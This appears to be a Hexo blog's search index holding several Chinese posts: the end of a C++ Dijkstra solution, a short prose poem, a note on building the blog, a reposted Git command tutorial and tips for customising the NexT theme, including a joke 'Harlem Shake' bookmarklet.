&#125;&#125;inline void read()&#123; cin &gt;&gt; t &gt;&gt; c &gt;&gt; S &gt;&gt; T; static int x, y, z; memset(a,10,sizeof(a)); for (static int i = 1; i &lt;= c; i++) &#123; cin &gt;&gt; x &gt;&gt; y &gt;&gt; z; if (a[x][y] &amp;&amp; a[x][y] &gt; z) &#123;a[x][y] = z;a[y][x] = z;&#125; &#125;&#125;int main()&#123;#ifdef LOCKL freopen ("1.in" , "r", stdin ); freopen ("1.out", "w", stdout);#endif read(); dijkstra(S); cout &lt;&lt; d[T]; return 0;&#125;By - Shq]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>dijkstra</tag>
        <tag>USACO</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无题]]></title>
    <url>%2Farticles%2Fsomethinks1%2F</url>
    <content type="text"><![CDATA[人生一梦，白云苍狗，错错对对，恩恩怨怨，终不过日月无声，水过无痕，所为弃者，一点执念而已。心微动，奈何情已远，物也非，人也非，事事非，往日不可重。时间很短，天涯很远，往后的一山一水，一朝一夕，自己安静地走完。倘若不慎走失迷途，跌入水中，也应该记得，有一条河流，叫重生。这世上任何地方，都可以生长；任何去处，都是归宿你。那么，别来找我，我亦不去寻你。守着剩下的流年，看一段岁月静好，现实安稳。有些事，我们明知道是错的，也要去坚持，因为不甘心；有些人，我们明知道是爱的，也要去放弃，因为没结局；有时候，我们明知道没路了，却还在前行，因为习惯了；]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>诗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如果临沂的夜晚没有风]]></title>
    <url>%2Farticles%2FaboutBlog%2F</url>
    <content type="text"><![CDATA[这座城市人很多，每天在路上都能看到好多拉着行李箱的人，不管他们是来到这座城市还是离开这座城市，至少他们都曾努力过。上面说的文字和下面的文章没有一点关系。其实呢，做Blog的网站有很多，比如 CSDN ，最近Luogu也推出了LuoguBlog，我也试了试这些Blog，但是都觉得不大好用，但是它们毕竟是一个技术类的博客网站，如果写一点生活杂谈还是不太好，而且 CSDN 上面挂载的广告，以及页面风格，我不太喜欢，因为我喜欢【精于心，简于形】。(强势插入广告23333)Hexo 是一个快速、简洁且高效的静态站点生成框架，它基于 Node.js 。 它有以下特点：超快速度Node.js 所带来的超快生成速度，让上百个页面在几秒内瞬间完成渲染。支持MarkdownHexo 支持 GitHub Flavored Markdown 的所有功能，甚至可以整合 Octopress 的大多数插件。一键部署只需一条指令即可部署到Github Pages，或其他网站丰富的插件Hexo 拥有强大的插件系统，安装插件可以让 Hexo 支持 Jade, CoffeeScript。通过 Hexo 你可以轻松地使用 Markdown 编写文章，除了 Markdown 本身的语法之外，还可以使用 Hexo 提供的 标签插件 来快速的插入特定形式的内容。这是我的第三个Blog了，中间失败了2个Blog，这几个Blog都是我随便乱改一些config文件导致的，所以说不要总想搞一个大新闻，也让我知道了一些大大小小的坑(比如hexo d后记得备份)，也曾迷茫，也曾彷徨。我也希望这次的Blog不要再炸了。在用这个Github Page之前，我也google百度了一些关于如何搭网站之类的东西，比如域名空间之类的啊，我这个人有选择恐惧症，而且我想，域名空间搞好以后，还要自己写页面这些的。关键是还要设计博客风格，页面样式这些的，一想到这些，就感觉是一个不小的工程啊，后来才发现我多虑了。后来无意中听一个dtzWyh的Blog，就知道了 Hexo 和 Next ，感觉风格和样式挺不错的，就去google了一些教程，自己搭了个Blog，也自学了Markdown最后，鸣谢一下所有帮助过Shq的人@Wyh,@Wzm,@jlacg]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[转]Git学习的一些总结]]></title>
    <url>%2Farticles%2Faboutgit%2F</url>
    <content type="text"><![CDATA[git 简介git 是分布式的，所以其核心就是分支，分支的意义在于，可以将项目代码按照功能、模块拆分成不同的分支。比如这个产品要加一个支付功能和一个登陆功能，可以创建两个分支，交给不同的开发人员并行开发。登陆功能先开发完，测试无误后合并改分支到 master 分支，master 分支部署上线。支付功能虽然没有开发完成，但是在另一条分支上，所以产品上线和功能开发完全不受影响。这才是分布式开发的高效模式。在 git 中，工作目录下面的所有文件都不外乎这两种状态：已跟踪或未跟踪。已跟踪的文件是指本来就被纳入版本控制管理的文件，在上次快照中有它们的记录，工作一段时间后，它们的状态可能是未更新，已修改或者已放入暂存区。而所有其他文件都属于未跟踪文件。它们既没有上次更新时的快照，也不在当前的暂存区域。初次克隆某个仓库时，工作目录中的所有文件都属于已跟踪文件，且状态为未修改。实用指令详解merge通常，合并分支时，如果可能，Git 会用 Fast froward 模式，但这种模式下，删除分支后，会丢掉分支信息。 如果要强制禁用 Fast forward 模式，Git 就会在 merge 时生成一个新的 commit ，这样，从分支历史上就可以看出分支信息。 git merge --no-ff -m &#39;merge with no-ff&#39; dev 因为本次合并要创建一个新的 commit，所以加上 -m 参数，把 commit 描述写进去。合并分支时，加上 --no-ff 参数就可以用普通模式合并，合并后的历史有分支，能看出来曾经做过合并，而 fast forward 合并就看不出来曾经做过合并。fetch一旦远程主机的版本库有了更新(git 术语叫做 commit)，需要将这些更新取回本地，这时就要用到 git fetch 命令。 git fetch &lt;远程主机名&gt; 上面命令将某个远程主机的更新，全部取回本地。 默认情况下，git fetch 取回所有分支(branch)的更新。如果只想取回特定分支的更新，可以指定分支名。 git fetch &lt;远程主机名&gt; &lt;分支名&gt; 比如，取回 origin 主机的 master 分支 git fetch origin master 所取回的更新，在本地主机上要用“远程主机名/分支名”的形式读取。比如 origin 主机的 master，就要用 origin/master 读取。git fetch -p ：取回远程更新，删除不存在的分支。pullgit pull 命令的作用是，取回远程主机的某个分支的更新，再与本地的指定分支合并，完整格式如下： git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt; 比如，取回origin主机的next分支，与本地的master分支合并，需要写成下面这样。 git pull origin next:master 如果远程分支是与当前分支合并，则冒号后面的部分可以省略。 git pull origin master 上面的命令表示，取回 origin/master 分支，再与当前分支合并。实质上，这等同于先做 git fetch，再 merge。12git fetch origingit merge origin/master在某些场合，git 会自动在本地分支与远程分支之间，建立一种追踪关系(tracking)。比如，在 git clone 的时候，所有本地分支默认与远程主机的同名分支，建立追踪关系，也就是说，本地的 master 分支自动“追踪” origin/master 分支。 git 也允许手动建立追踪关系。 git branch --set-upstream master origin/next 上面的命令指定 master 分支追踪 origin/next 分支。 如果当前分支与远程分支存在追踪关系，git pull 就可以省略远程分支名。 git pull origin 上面命令表示，本地的当前分支自动与对应的 origin 主机“追踪分支”(remote-tracking branch)进行合并。 如果当前分支只有一个追踪分支，连远程主机名都可以忽略。 git pull 上面命令表示，当前分支自动与唯一一个追踪分支进行合并。 如果合并需要采用 rebase 模式，可以使用 -rebase 选项。 git pull --rebase &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;pushgit push 命令用于将本地分支的更新，推送到远程主机。它的格式与 git pull 命令相仿。 git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt; 如果省略远程分支名，则表示将本地分支推送与之存在“追踪关系”的远程分支(通常两者同名)，如果该远程分支不存在，则会被新建。 git push origin master 上面命令表示，将本地的 master 分支推送到 origin 主机的 master 分支。如果后者不存在，则会被新建。 如果省略本地分支名，则表示删除指定的远程分支，因为这等同于推送一个空的本地分支到远程分支。 git push origin :master 等同于 git push origin --delete master 上面命令表示删除 origin 主机的 master 分支。 如果当前分支与远程分支之间存在追踪关系，则本地分支和远程分支都可以省略。 git push origin 上面命令表示，将当前分支推送到 origin 主机的对应分支。 如果当前分支只有一个追踪分支，那么主机名都可以省略。 git push 如果当前分支与多个主机存在追踪关系，则可以使用-u选项指定一个默认主机，这样后面就可以不加任何参数使用 git push 。 git push -u origin master 上面的命令将本地 master 分支推送到 origin 主机，同时指定 origin 为默认主机，后面就可以不加任何参数使用 git push 了。 不带任何参数的 git push ，默认只推送当前分支，这叫做 simple 方式。此外，还有一种 matching 方式，会推送所有有对应的远程分支的本地分支。 git 2.0 版本之前，默认采用 matching 方式，现在改为默认采用 simple 方式，如果要修改这个设置，可以采用 git config 命令。 git config --global push.default matching 或者 git config --global push.default simple 还有一种情况，就是不管是否存在对应的远程分支，将本地的所有分支都推送到远程主机，这时需要使用 -all 选项。 git push --all origin 上面命令表示，将所有本地分支都推送到 origin 主机。 如果远程主机的版本比本地版本更新，推送时 git 会报错，要求先在本地做 git pull 合并差异，然后再推送到远程主机。这时，如果你一定要推送，可以使用 -force 选项。 git push --force origin 上面命令使用-force选项，结果导致在远程主机产生一个“非直进式”的合并(non-fast-forward merge)。除非你很确定要这样做，否则应该尽量避免使用 -force 选项。 最后，git push 不会推送标签(tag)，除非使用 -tags 选项。 git push origin --tagsloggit log 命令可以查看历史记录，git log 命令显示从最近到最远的提交日志； 如果嫌输出信息太多，看得眼花缭乱的，可以试试 git log --pretty=oneline 。我们可以看到当前版本以及之前的版本日志以及版本号。 用 git log --graph 命令可以看到分支合并图。 或者两个参数一起用： git log --graph --pretty=oneline git log --graph --pretty=oneline --abbrev-commit 首先，git 必须知道当前版本是哪个版本，在 git 中，用 HEAD 表示当前版本，上一个版本就是 HEAD^ ，上上一个版本就是 HEAD^^ ， 当然往上100个版本写100个 ^ 比较容易数不过来，所以写成 HEAD~100 。 现在，我们要把当前版本回退到上一个版本，就可以使用 git reset 命令： git reset --hard HEAD^ 当你回退到了某个版本后，git log 只能显示此版本及之前的版本的日志，之后的版本日志就看不到了，但是，我们想恢复到之后教新的版本怎么办？ Git 提供了一个命令 git reflog 用来记录你的每一次命令tag查看标签（用来标记标志性的稳定版本信息） 发布一个版本时，我们通常先在版本库中打一个标签(tag)，这样，就唯一确定了打标签时刻的版本。将来无论什么时候，取某个标签的版本，就是把那个打标签的时刻的历史版本取出来。所以，标签也是版本库的一个快照。 相比于 commit 的版本号(40位16进制)，标签号则要好使的多。 所以，tag 就是一个让人容易记住的有意义的名字，它跟某个 commit 绑定在一起。git tag [tag name] 如果没有标签名，则为查看所有标签，带标签名则为新建标签git tag &lt;tag name&gt; 就可以打一个新标签还可以创建带有说明的标签，用 -a 指定标签名，-m 指定说明文字。 git tag -a &lt;tag name&gt; -m &lt;comment&gt; ：添加带注释的标签 eg: git tag -a v1.2 -m &#39;version 1.2 released&#39;git tag -a &lt;tag name&gt; &lt;md5&gt; ：对某个版本打标签 默认标签是打在最新提交的 commit 上的。有时候，如果忘了打标签，比如，现在已经是周五了，但应该在周一打的标签没有打，怎么办？ 方法是找到历史提交的 commit id，然后打上就可以了。 git log --pretty=oneline --abbrev-commit 比方说要对 add merge 这次提交打标签，它对应的 commit id 是 6224937，那么我们就可以使用命令： git tag v1.2 6224937 再用命令 git log 查看标签可以用 git show &lt;tagname&gt; 查看标签信息如果标签打错了，也可以删除： git tag -d v1.2如果要推送某个标签到远程，使用命令 git push origin &lt;tagname&gt; eg: git push origin v1.2如果标签已经推送到远程，要删除远程标签就要麻烦一点，先从本地删除： git tag -d v1.2 然后，从远程删除；删除命令也是 push ，但是格式如下： git push origin :ref/tags/v1.2git tag -l &#39;[expression]&#39; 查看那符合正则表达式的stashgit stash 备份当前的工作区的内容，从最近的一次提交中读取相关内容，让工作区保证和上次提交的内容一致。同时，将当前的工作区内容保存到 Git 栈中。 git stash pop 从 Git 栈中读取最近一次保存的内容，恢复工作区的相关内容。由于可能存在多个 stash 的内容，所以用栈来管理，pop 会从最近的一个 stash 中读取内容并恢复。 git stash list 显示 Git 栈中内的所有备份，可以利用这个列表来决定从哪个地方恢复。 git stash clear : 清空 Git 栈。使用 git 的时候，我们往往使用 branch 解决任务切换问题，例如，我们往往会建一个自己的分支去修改和调试代码，如果别人或者自己发现原有的分支上有个不得不修改的 bug，我们往往会把完成一半的代码 commit 提交到本地仓库，然后切换分支去修改 bug，改好之后再切换回来。这样的话往往 log 上会有大量不必要的记录。其实如果我们不想提交完成一半或者不完善的代码，但是却不得不去修改一个紧急 bug，那么使用 git stash 就可以将你当前未提交到本地的代码推入到 git 的栈中，这时候你的工作区间和上一次提交的内容是完全一样的，所以你可以放心的修 bug，等到修完 bug，提交到服务器上后，再使用 git stash apply 将以前一般的工作应用回来。也许有的人会说，那我可不可以多次将未提交的代码压入到栈中？答案是可以的。当你多次使用 git stash 命令后，你的栈里将充满了未提交的代码，这时候你会对将哪个版本应用回来有些困惑， git stash list 命令可以将当前的 Git 栈信息打印出来，你只需要将找到对应的版本号，例如使用 git stash apply stash@{1} 就可以将你指定版本号为 stash@{1} 的工作取出来，当你将所有的栈都应用回来的时候，可以使用 git stash clear 来将栈清空。 在这里顺便提下 git format-patch -n , n是具体某个数字， 例如 ‘git format-patch -1’ 这时便会根据log生成一个对应的补丁，如果 ‘git format-patch -2’ 那么便会生成 2 个补丁，当然前提是你的 log 上有至少有两个记录。看过上面的信息，就可以知道使用场合了：当前工作区内容已被修改，但是并未完成。这时 Boss 来了，说前面的分支上面有一个 bug，需要立即修复。可是我又不想提交目前的修改，因为修改没有完成。但是，不提交的话，又没有办法 checkout 到前面的分支。此时用 git stash 就相当于备份了工作区了。然后在 checkout 过去修改，就能够达到保存当前工作区，并及时恢复的作用。注意这里由于只 stash 了一次所以要使用 pop，具体你存放了多少。remote查看远程仓库名git remote -v 查看远程仓库urlgit remote add &lt;basename&gt; &lt;url&gt; 新增远程仓库git remote show &lt;basename&gt; 查看远程仓库详细信息git remote rename &lt;old basename&gt; &lt;new basename&gt; 重命名远程仓库commitgit commit -a -m &#39;xx&#39; 暂存并提交branchgit branch 查看本地仓库分支git branch -r 查看远程分支情况git branch -a 查看本地和远程的所有分支情况git branch -v 查看本地仓库分支最后一次提交情况git branch -vv 查看分支跟踪情况git branch &lt;branch name&gt; 新建分支git branch -d &lt;branch name&gt; 删除分支git branch -D &lt;branch name&gt; 强制删除分支git branch [--merged | --no-merged] 查看已合并|未合并的本地仓库分支git branch -u &lt;remote base&gt;/&lt;remote branch&gt; 修改当前跟踪分支checkoutgit checkout -- [file] ：恢复文件 git checkout -- demo.html 意思就是，把 demo.html 文件在工作区的修改全部撤销，这里有两种情况： 一种是 demo.html 自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态； 一种是 demo.html 已经添加到暂存区后，又作了修改，现在，撤销修改就回到添加暂存区后的状态。 总之，就是让这个文件回到最后一次 git commit 或 git add 时的状态。但是如果 git add 到暂存区了，在 commit 之前，想撤销： Git 同样告诉我们，用命令 git reset HEAD file 可以把暂存区的修改撤销掉(unstage)，重新放回工作区。 git reset 命令既可以回退版本，也可以把暂存区的修改回退到工作区，当我们用 HEAD 时，表示最新的版本。 再用 git status 查看一下，现在暂存区是干净的，工作区有修改： 还记得如果丢弃工作区的修改吗？ 对的，使用：git checkout -- demo.htmlgit checkout 其实是用版本库里的版本替换工作区的版本，无论工作区是修改还是删除，都可以”一键还原”。git checkout -b [branchname] [tagname] 在特定的版本上创建一个新的分支并切换到此分支git checkout -b [local branch] [remote base]/[remote branch] 将远程分支检出到本地分支，并追踪git checkout --track &lt;remote base&gt;/&lt;remote branch&gt; 让当前分支跟踪远程分支rebasegit rebase [basebranch] 变基是将一系列提交按照原有次序依次应用到另一分支上，而合并是把最终结果合在一起。常见问题git clonegit clone 支持多种协议，除了HTTP(s)以外，还支持SSH、Git、本地文件协议等。 使用 https 除了速度慢意外，还有个最大的麻烦是每次推送都必须输入口令，但是在某些只开放 http 端口的公司内部就无法使用 ssh 协议而只能用 https。git clone &lt;版本库的网址&gt; &lt;本地目录名&gt; 如果不写本地目录名，默认就是版本库的名字如何新建分支本地建立 branch 並立即切换到新分支 git checkout -b &lt;branch_name&gt;下面的命令表示，在 origin/master 的基础上，创建一个分支。 git checkout -b newBranch origin/master修改分支名称 git branch -m &lt;new_name&gt;从远程仓库拉取代码到本地仓库，并建立跟踪关系git checkout -b &lt;本地新分支名&gt; &lt;对应的远程分支名&gt;如何在远程仓库新建一个分支新建一个本地分支，按照正常流程提交完代码后，推送到远程 git push &lt;remote base&gt; &lt;local branch&gt;:&lt;remote branch&gt;比较文件git diff HEAD -- demo.html 命令可以查看工作区的 demo.html 和版本库里面最新版本的区别。忽略某些文件默认方法是在当前项目目录下创建一个 .gitignore 文件，如果需要忽略的文件已经添加到版本库中，请先移除 git rm --cached [file] 不删除文件，只移除追踪。123cat .gitignore*.[oa]*~文件 .gitignore 的格式规范如下：所有空行或者以注释符号 # 开头的目录都会被 git 忽略可以使用标准的 glob 模式匹配匹配模式最后跟反斜杠（/）说明要忽略的目录要忽略指定模式以外的文件或目录，可以在模式前加上惊叹号（!）取反​bug 分支git 提供了一个 stash 功能，可以把当前工作现场“储藏”起来，等以后恢复现场后继续工作。 git stash 修改完 bug 后，回到当前分支上继续干活，工作区是干净的，刚才的工作现场存到哪里去了？ git stash list ：查看 stash 列表(stash 是一个栈的结构) git 把 stash 内容存在某个地方了，但是需要恢复一下，有两个办法： 一是用 git stash apply 恢复，但是恢复后，stash 内容并不删除，你需要用 git stash drop 来删除； 另一种方式是用 git stash pop ，恢复的同时把 stash 内容也删了； 你可以多次 stash ，恢复的时候，先用 git stash list 查看，然后恢复指定的 stash，用命令： git stash apply stash@{0}配置文件配置 Git 的时候，加上 –global 是针对当前用户起作用的，如果不加，那只针对当前的仓库起作用。 配置文件放哪了？ 每个仓库的 Git 配置文件都放在 .git/config 文件中，在这份配置文件中，别名就在 [alias] 后面，要删除别名，直接把对应的行删掉即可。查看配置git config -1设置git push 默认git config --global push.default current设置别名git config --global alias.&lt;name&gt; &lt;commend&gt; 我的设置： git config --global alias.st status git config --global alias.cm &quot;commit -m&quot; git config --global alias.ph &quot;push origin &lt;local_repository&gt;:&lt;remote_repository&gt;&quot;保存用户名和密码对于http(s)协议，可以用下面命令临时缓存git config --global credential.helper cache 开启linux缓存 git config --global credential.helper wincred 开启windows缓存对于 ssh 协议，可以用 ssh key，具体教程网上很多解决问题问题一git 中执行命令 add . 报错：Unlink of file ‘templates/opms.exe’ failed.Should I try again?(y/n)因为这个文件正在被占用，所以不能添加到暂存区，而正好这个 .exe 文件，我们是不需要添加到版本管理工具的。所以我们选择 n 。问题二git 中生成 sshkey: ssh-keygen -t rsa -C &quot;youremail&quot; 这个email并没有什么用 所以我们使用ssh-keygen -t rsa来生成sshkey就可以了。 然后git中的配置文件： git config --list git config --global user.name &quot;yu&quot; git config --global user.email &quot;react.dong.yu@gmail.com&quot; 这种配置将会对本地所有的git仓库有效。 那么在 push 的时候，远程就知道这个push来自于哪个email. 但有时候在公司的时候，有的仓库是公司的，有的仓库是自己github的。 这个时候就可以不设置global的配置了，而是在自己的仓库中设置 git config --local user.email &quot;react.dong.yu@gmail.com&quot;问题三使用 windows 的同学注意了，如果你在资源管理器里新建一个 .gitignore 文件，它会提示你必须输入文件名，但是在文本编辑器里“保存”或者“另存为”就可以把文件保存为 .gitignore 了。 有些时候，你想添加一个文件到 git，但发现添加不了，原因是这个文件被 .gitignore 忽略了： git add App.class 如果你确实想添加该文件，可以用 -f 制添加到 git： git add -f App.class 或者你发现，可能是 .gitignore 写得有问题，需要找出来到底哪个规则写错了。 可以用 git check-ignore 命令检查： git check-ignore -v App.class问题四为什么我把我生成的 ssh key 添加到了 github 中 然后 也 remote 了 https://github.com/Blog-Shq/Xxx.git 为什么提交的时候报错，或者提示 输入密码账号是为什么ssh key 是 ssh 协议的密钥，http 协议没权限问题五git怎样删除未监视的文件 untracked files? 用 git clean12345678910111213# 删除 untracked filesgit clean -f # 连 untracked 的目录也一起删掉git clean -fd # 连 gitignore 的untrack 文件/目录也一起删掉 （慎用，一般这个是用来删掉编译出来的 .o之类的文件用的）git clean -xfd # 在用上述 git clean 前，墙裂建议加上 -n 参数来先看看会删掉哪些文件，防止重要文件被误删git clean -nxfdgit clean -nfgit clean -nfd我的常用命令12git branch -avvgit remote -v权威教程 Pro Git 简体中文版]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo的一些玄学操作]]></title>
    <url>%2Farticles%2Fuse-hexo%2F</url>
    <content type="text"><![CDATA[关于hexohexo 是博客框架，将支持的类型的文件转换成静态Web页面(html+css+javascript)在这里我就不赘述hexo 的安装使用过程了，大家可以自行google,google(百度也可以)上有很多关于此方面的内容，在这里，我就推荐一个教程:HEXO+Github,搭建属于自己的博客,可以自行学习hexo的玄学操作这里就不介绍一些基础操作了(然而是我太懒)，话不多说，下面就介绍一些hexo的玄学操作（其实是拓展功能）首先，我们要明白：在 Hexo 中有两份主要的配置文件，其名称都是 _config.yml 。其中，一份位于站点根目录下，主要包含 Hexo 本身的配置；另一份位于主题目录下，这份配置由主题作者提供，主要用于配置主题相关的选项。我们约定，将前者称为 站点配置文件，后者称为 主题配置文件1. 添加居中模块优秀的人，不是不合群，而是他们合群的人里面没有你代码如下：1&lt;blockquote class="blockquote-center"&gt;优秀的人，不是不合群，而是他们合群的人里面没有你&lt;/blockquote&gt;2. 添加high一下打开博客根目录 \themes\next\layout\_partials\header.swig ，在 &lt;ul&gt; ... /ul&gt; 标签之间加入以下代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137&lt;li&gt; &lt;a title="把这个链接拖到你的Chrome收藏夹工具栏中" href='javascript:(function() &#123; function c() &#123; var e = document.createElement("link"); e.setAttribute("type", "text/css"); e.setAttribute("rel", "stylesheet"); e.setAttribute("href", f); e.setAttribute("class", l); document.body.appendChild(e) &#125; function h() &#123; var e = document.getElementsByClassName(l); for (var t = 0; t &lt; e.length; t++) &#123; document.body.removeChild(e[t]) &#125; &#125; function p() &#123; var e = document.createElement("div"); e.setAttribute("class", a); document.body.appendChild(e); setTimeout(function() &#123; document.body.removeChild(e) &#125;, 100) &#125; function d(e) &#123; return &#123; height : e.offsetHeight, width : e.offsetWidth &#125; &#125; function v(i) &#123; var s = d(i); return s.height &gt; e &amp;&amp; s.height &lt; n &amp;&amp; s.width &gt; t &amp;&amp; s.width &lt; r &#125; function m(e) &#123; var t = e; var n = 0; while (!!t) &#123; n += t.offsetTop; t = t.offsetParent &#125; return n &#125; function g() &#123; var e = document.documentElement; if (!!window.innerWidth) &#123; return window.innerHeight &#125; else if (e &amp;&amp; !isNaN(e.clientHeight)) &#123; return e.clientHeight &#125; return 0 &#125; function y() &#123; if (window.pageYOffset) &#123; return window.pageYOffset &#125; return Math.max(document.documentElement.scrollTop, document.body.scrollTop) &#125; function E(e) &#123; var t = m(e); return t &gt;= w &amp;&amp; t &lt;= b + w &#125; function S() &#123; var e = document.createElement("audio"); e.setAttribute("class", l); e.src = i; e.loop = false; e.addEventListener("canplay", function() &#123; setTimeout(function() &#123; x(k) &#125;, 500); setTimeout(function() &#123; N(); p(); for (var e = 0; e &lt; O.length; e++) &#123; T(O[e]) &#125; &#125;, 15500) &#125;, true); e.addEventListener("ended", function() &#123; N(); h() &#125;, true); e.innerHTML = " &lt;p&gt;If you are reading this, it is because your browser does not support the audio element. We recommend that you get a new browser.&lt;/p&gt; &lt;p&gt;"; document.body.appendChild(e); e.play() &#125; function x(e) &#123; e.className += " " + s + " " + o &#125; function T(e) &#123; e.className += " " + s + " " + u[Math.floor(Math.random() * u.length)] &#125; function N() &#123; var e = document.getElementsByClassName(s); var t = new RegExp("\\b" + s + "\\b"); for (var n = 0; n &lt; e.length; ) &#123; e[n].className = e[n].className.replace(t, "") &#125; &#125; var e = 30; var t = 30; var n = 350; var r = 350; var i = "//7xuupy.com1.z0.glb.clouddn.com/tongxingSibel%20-%20Im%20Sorry.mp3"; var s = "mw-harlem_shake_me"; var o = "im_first"; var u = ["im_drunk", "im_baked", "im_trippin", "im_blown"]; var a = "mw-strobe_light"; var f = "//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css"; var l = "mw_added_css"; var b = g(); var w = y(); var C = document.getElementsByTagName("*"); var k = null; for (var L = 0; L &lt; C.length; L++) &#123; var A = C[L]; if (v(A)) &#123; if (E(A)) &#123; k = A; break &#125; &#125; &#125; if (A === null) &#123; console.warn("Could not find a node of the right size. Please try a different page."); return &#125; c(); S(); var O = []; for (var L = 0; L &lt; C.length; L++) &#123; var A = C[L]; if (v(A)) &#123; O.push(A) &#125; &#125; &#125;)() '&gt;High一下&lt;/a&gt; &lt;/li&gt;3. 添加最近访客在需要添加最近访客的网页对应的 markdown 文件中添加如下代码：12最近访客&lt;div class=&quot;ds-recent-visitors&quot; data-num-items=&quot;39&quot; data-avatar-size=&quot;40&quot; id=&quot;ds-recent-visitors&quot;&gt;&lt;/div&gt;4. 鼠标点击小红心的设置将 love.js 文件添加到 \themes\next\source\js\src 文件目录下。找到 \themes\next\layout\_layout.swing 文件，在文件的后面，&lt;/body&gt;标签之前添加以下代码：12&lt;!-- 页面点击小红心 --&gt;&lt;script type="text/javascript" src="/js/src/love.js"&gt;&lt;/script&gt;(未完待续)]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
</search>
